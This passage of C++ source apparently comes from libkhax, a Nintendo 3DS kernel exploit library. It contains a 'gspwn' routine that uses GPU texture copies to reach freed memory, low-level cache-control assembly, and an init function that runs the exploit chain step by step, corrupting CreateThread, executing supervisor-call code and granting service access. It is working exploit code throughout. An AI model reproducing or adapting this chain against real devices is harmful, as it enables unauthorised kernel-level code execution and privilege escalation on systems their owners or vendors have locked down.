		DumpMemberToSDCard(&MemChunkHax::m_savedThreadSVC, "ThreadSVC-%08X-%s.bin");
	}
#endif

	// If we're corrupted, we're dead.
	if (m_corrupted > 0)
	{
		KHAX_printf("~:error while corrupt;freezing\n");
		for (;;)
		{
			svcSleepThread(s64(60) * 1000000000);
		}
	}

	// This function has to be careful not to crash trying to shut down after an aborted attempt.
	if (m_overwriteMemory)
	{
		u32 dummy;

		// Each page has a flag indicating that it is still allocated.
		for (unsigned x = 0; x < KHAX_lengthof(m_overwriteMemory->m_pages); ++x)
		{
			// Don't free a page unless it remains allocated.
			if (m_overwriteAllocated & (1u << x))
			{
				Result res = svcControlMemory(&dummy, reinterpret_cast<u32>(&m_overwriteMemory->m_pages[x]), 0,
					sizeof(m_overwriteMemory->m_pages[x]), MEMOP_FREE, static_cast<MemPerm>(0));
				KHAX_printf("free %u: %08lx\n", x, res);
				KHAX_UNUSED(res);
			}
		}
	}

	// Free the extra linear memory.
	if (m_extraLinear)
	{
		linearFree(m_extraLinear);
	}

	// s_instance better be us
	if (s_instance != this)
	{
		KHAX_printf("~:s_instance is wrong\n");
	}
	else
	{
		s_instance = nullptr;
	}
}


//------------------------------------------------------------------------------------------------
//
// Miscellaneous
//

//------------------------------------------------------------------------------------------------
// Make an error code
inline Result KHAX::MakeError(Result level, Result summary, Result module, Result error)
{
	return (level << 27) + (summary << 21) + (module << 10) + error;
}

//------------------------------------------------------------------------------------------------
// Check whether this system is a New 3DS.
Result KHAX::IsNew3DS(bool *answer, u32 kernelVersionAlreadyKnown)
{
	// If the kernel version isn't already known by the caller, find out.
	u32 kernelVersion = kernelVersionAlreadyKnown;
	if (kernelVersion == 0)
	{
		kernelVersion = osGetKernelVersion();
	}

	// APT_CheckNew3DS doesn't work on < 8.0.0, but neither do such New 3DS's exist.
	if (kernelVersion >= SYSTEM_VERSION(2, 44, 6))
	{
		// Check whether the system is a New 3DS.  If this fails, abort, because being wrong would
		// crash the system.
		u8 isNew3DS = 0;
		if (Result error = APT_CheckNew3DS(&isNew3DS))
		{
			*answer = false;
			return error;
		}

		// Use the result of APT_CheckNew3DS.
		*answer = isNew3DS != 0;
		return 0;
	}

	// Kernel is older than 8.0.0, so we logically conclude that this cannot be a New 3DS.
	*answer = false;
	return 0;
}

//------------------------------------------------------------------------------------------------
// gspwn, meant for reading from or writing to freed buffers.
Result KHAX::GSPwn(void *dest, const void *src, std::size_t size, bool wait)
{
	// Copy that floppy.
	if (Result result = GX_TextureCopy(static_cast<u32 *>(const_cast<void *>(src)), 0,
		static_cast<u32 *>(dest), 0, size, 8))
	{
		KHAX_printf("gspwn:copy fail:%08lx\n", result);
		return result;
	}

	// Wait for the operation to finish.
	if (wait)
	{
		gspWaitForPPF();
	}

	return 0;
}

Result KHAX::userFlushDataCache(const void *p, std::size_t n)
{
	return GSPGPU_FlushDataCache(p, n);
}

Result KHAX::userInvalidateDataCache(const void *p, std::size_t n)
{
	return GSPGPU_InvalidateDataCache(p, n);
}

void KHAX::userFlushPrefetch()
{
	__asm__ volatile ("mcr p15, 0, %0, c7, c5, 4\n" :: "r"(0));
}

void KHAX::userDsb()
{
	__asm__ volatile ("mcr p15, 0, %0, c7, c10, 4\n" :: "r"(0));
}

void KHAX::userDmb()
{
	__asm__ volatile ("mcr p15, 0, %0, c7, c10, 5\n" :: "r"(0));
}

void KHAX::kernelCleanDataCacheLineWithMva(const void *p)
{
	__asm__ volatile ("mcr p15, 0, %0, c7, c10, 1\n" :: "r"(p));
}

void KHAX::kernelInvalidateInstructionCacheLineWithMva(const void *p)
{
	__asm__ volatile ("mcr p15, 0, %0, c7, c5, 1\n" :: "r"(p));
}

//------------------------------------------------------------------------------------------------
// Given a pointer to a structure that is a member of another structure,
// return a pointer to the outer structure.  Inspired by Windows macro.
template <typename Outer, typename Inner>
Outer *KHAX::ContainingRecord(Inner *member, Inner Outer::*field)
{
	unsigned char *p = reinterpret_cast<unsigned char *>(member);
	p -= reinterpret_cast<std::uintptr_t>(&(static_cast<Outer *>(nullptr)->*field));
	return reinterpret_cast<Outer *>(p);
}

//------------------------------------------------------------------------------------------------
// Main initialization function interface.
extern "C" Result khaxInit()
{
	using namespace KHAX;

#ifdef KHAX_DEBUG
	bool isNew3DS;
	IsNew3DS(&isNew3DS, 0);
	KHAX_printf("khaxInit: k=%08lx f=%08lx n=%d\n", osGetKernelVersion(), osGetFirmVersion(),
		isNew3DS);
#endif

	// Look up the current system's version in our table.
	const VersionData *versionData = VersionData::GetForCurrentSystem();
	if (!versionData)
	{
		KHAX_printf("khaxInit: Unknown kernel version\n");
		return MakeError(27, 6, KHAX_MODULE, 39);
	}

	KHAX_printf("verdat t=%08lx s=%08lx v=%08lx\n", versionData->m_threadPatchAddress,
		versionData->m_syscallPatchAddress, versionData->m_fcramVirtualAddress);

	// Create the hack object.
	MemChunkHax hax{ versionData };

	// Run through the steps.
	if (Result result = hax.Step1_Initialize())
	{
		KHAX_printf("khaxInit: Step1 failed: %08lx\n", result);
		return result;
	}
	if (Result result = hax.Step2_AllocateMemory())
	{
		KHAX_printf("khaxInit: Step2 failed: %08lx\n", result);
		return result;
	}
	if (Result result = hax.Step3_SurroundFree())
	{
		KHAX_printf("khaxInit: Step3 failed: %08lx\n", result);
		return result;
	}
	if (Result result = hax.Step4_VerifyExpectedLayout())
	{
		KHAX_printf("khaxInit: Step4 failed: %08lx\n", result);
		return result;
	}
	if (Result result = hax.Step5_CorruptCreateThread())
	{
		KHAX_printf("khaxInit: Step5 failed: %08lx\n", result);
		return result;
	}
	if (Result result = hax.Step6_ExecuteSVCCode())
	{
		KHAX_printf("khaxInit: Step6 failed: %08lx\n", result);
		return result;
	}
	if (Result result = hax.Step7_GrantServiceAccess())
	{
		KHAX_printf("khaxInit: Step7 failed: %08lx\n", result);
		return result;
	}

	KHAX_printf("khaxInit: done\n");
	return 0;
}

//------------------------------------------------------------------------------------------------
// Shut down libkhax.  Doesn't actually do anything at the moment, since khaxInit does everything
// and frees all memory on the way out.
extern "C" Result khaxExit()
{
	return 0;
}
